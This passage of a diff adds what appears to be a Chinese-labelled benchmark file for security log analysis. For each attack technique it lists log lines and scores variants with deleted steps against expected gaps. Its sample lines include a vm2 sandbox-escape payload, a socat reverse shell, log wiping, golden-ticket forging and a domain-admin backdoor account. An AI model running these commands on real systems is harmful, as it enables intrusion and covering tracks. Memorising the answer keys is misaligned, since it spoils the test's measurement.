+      "/api/v1/report/preview {\"code\":\"process.binding('spawn_sync').spawn({args:['-c','id']})\"} Mozilla/5.0 (Linux; ",
+      "/api/v1/report/preview {\"code\":\"process.binding('spawn_sync').spawn({args:['-c','id']})\"} Mozilla/5.0 (Linux; "
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-node-140.ops-corp.com/api/v1/report/preview {\"sandbox_escape\": \"spawn_sync\", \"runtime\": \"vm2\"} Moz"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id）",
+     "n_lines": 1,
+     "lines": [
+      "id /bin/id id <== /bin/dash -c 'id' <== /usr/bin/node /opt/app/preview-worker.js"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（socat）",
+     "n_lines": 1,
+     "lines": [
+      "socat TCP:10.20.5.19:8443 EXEC:/bin/bash,pty,setsid,sigint,sane socat socat TCP:10.20.5.19 <== /usr/sbin/sshd "
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（socat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1077": {
+   "unit": 1077,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Drupal Form API 注入远程代码执行 (Drupalgeddon2)",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/user/register）",
+     "n_lines": 2,
+     "lines": [
+      "/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;",
+      "/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-php-198.ops-corp.com/user/register {\"drupalgeddon2\": \"element_parents\", \"cmd\": \"id\"} Mozilla/5.0 ("
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id）",
+     "n_lines": 1,
+     "lines": [
+      "id /usr/bin/id id <== /bin/bash -c 'id' <== /usr/sbin/apache2 -k start"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（rm）",
+     "n_lines": 1,
+     "lines": [
+      "rm -f /var/log/apache2/access.log /tmp/.i* && history -c rm rm -f /var/log/apache2/access.log /tmp/.i* <== /us"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（rm）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1101": {
+   "unit": 1101,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "域控与域管组枚举（net user /domain + nltest /dclist）",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1109": {
+   "unit": 1109,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "黄金票据伪造（kerberos::golden /krbtgt: → ptt → 访问 DC C$）",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（kerberos::golden）",
+     "n_lines": 1,
+     "lines": [
+      "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（kerberos::ptt）",
+     "n_lines": 1,
+     "lines": [
+      "kerberos::ptt C:\\temp\\adm.kirbi tk.exe kerberos::ptt C:\\temp\\adm.kirbi <== cmd.exe /c tk.exe <== services.exe"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（dir）",
+     "n_lines": 1,
+     "lines": [
+      "dir \\\\dc01.corp.local\\C$ cmd.exe cmd.exe /c dir \\\\dc01.corp.local\\C$ <== cmd.exe /c dir <== svchost.exe"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（kerberos::ptt）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（kerberos::ptt）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（kerberos::ptt）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（kerberos::ptt）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（dir）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1113": {
+   "unit": 1113,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "域账号后门（net user /add /domain + 加入 Domain Admins）",
+   "source_sequence": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\\admin"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（net）",
+     "n_lines": 1,
+     "lines": [
+      "net group \"Domain Admins\" svc_sqladd /add /domain net.exe net group \"Domain Admins\" svc_sqladd <== CORP\\admin"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（runas）",
+     "n_lines": 1,
+     "lines": [
+      "runas /netonly /user:corp.local\\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\\admin"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2
+     ],
+     "variant": "full",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2
+     ],
+     "variant": "del1",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（net）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（net）",
+       "sources": [
+        "hids"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（runas）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1122": {
+   "unit": 1122,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "PyPI 恶意包 setup.py 构建期执行（构建后端注入）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/v2/packages/install）",
+     "n_lines": 2,
+     "lines": [
+      "/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro",
+      "/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-django-88.ops-corp.com/api/v2/packages/install {\"build_step\": \"setup.py\", \"exec\": \"os.system\"} Moz"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（python）",
+     "n_lines": 1,
+     "lines": [
+      "python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（python）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  }
+ }
+}
